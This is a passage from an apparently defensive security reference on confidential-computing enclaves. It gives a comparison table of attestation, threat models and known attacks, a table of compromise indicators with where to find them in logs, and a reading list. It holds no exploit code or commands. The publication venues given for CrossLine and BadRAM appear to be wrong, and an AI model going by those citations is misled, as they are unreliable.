| Hardware attestation | EPID/ECDSA | TDX Module cert | VCEK cert | AWS Nitro cert | Cloud cert |
| Threat model | OS/hypervisor untrusted | Cloud untrusted | Cloud untrusted | AWS untrusted | Consortium trust |
| Common attacks | Foreshadow/SGAxe/LVI | TDREPORT tamper | CrossLine/BadRAM | Replay | Governance abuse |
| Cryptography | AES-GCM, ECDSA | TDX Module sig | ECDSA-SNP | COSE-Sign1 | Consortium sig |
| Detection | AEX notify | VM integrity | RMP violations | NSM events | Proposal audit |

---

## Indicator of Compromise (IOC) Patterns

| Pattern | Where to look | Likely attack |
|---|---|---|
| Attestation nonce mismatch | Verifier logs | Replay |
| Old attestation quote | Verifier logs | Stale quote reuse |
| New PCR value | CloudTrail / Azure Audit | Enclave binary tampered |
| Unusual AEX count | SGX perf counters | Single-step side channel |
| SEV-SNP RMP violation | dmesg / libvirt | Memory integrity attack |
| CCF constitution change | CCF audit log | Governance abuse |
| Gramine syscall trace anomaly | Gramine log | Libos escape attempt |
| Nitro NSM unexpected query | NSM perf counter | Attestation enumeration |
| Enclave binary signature change | Manifest audit | Sealed-secret tampering |

---

## Reference Reading

- Foreshadow — https://foreshadowattack.eu/
- SGAxe — https://cacheoutattack.com/
- LVI — https://lviattack.eu/
- ÆPIC Leak — https://aepicleak.com/
- CrossLine — USENIX Security 2025 (paper)
- BadRAM — USENIX Security 2024 (paper)
- Intel SGX Developer Reference — https://download.01.org/intel-sgx/latest/linux-latest/docs/
- AMD SEV-SNP ABI — https://www.amd.com/system/files/TechDocs/56860.pdf
- Azure CCF Documentation — https://microsoft.github.io/CCF/
- Marblerun Documentation — https://edgeless.systems/docs/
- Gramine Documentation — https://gramineproject.io/docs/
- MITRE ATT&CK — T1068 Exploitation for Privilege Escalation, T1556 Modify Authentication Process
